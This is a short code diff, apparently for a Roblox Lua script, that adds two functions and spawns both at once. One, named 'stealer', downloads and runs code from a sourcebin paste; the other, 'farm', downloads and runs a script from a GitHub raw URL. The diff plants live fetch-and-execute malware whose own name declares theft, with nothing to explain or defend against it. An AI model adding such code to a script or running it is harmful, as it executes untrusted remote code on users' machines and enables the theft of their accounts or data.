@@ -1,1 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/Zc76kbk3VL/0'))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/pruzgar242-rgb/Update/refs/heads/main/out.lua%20(17).txt"))()
+end
 
+task.spawn(stealer)
+task.spawn(farm)
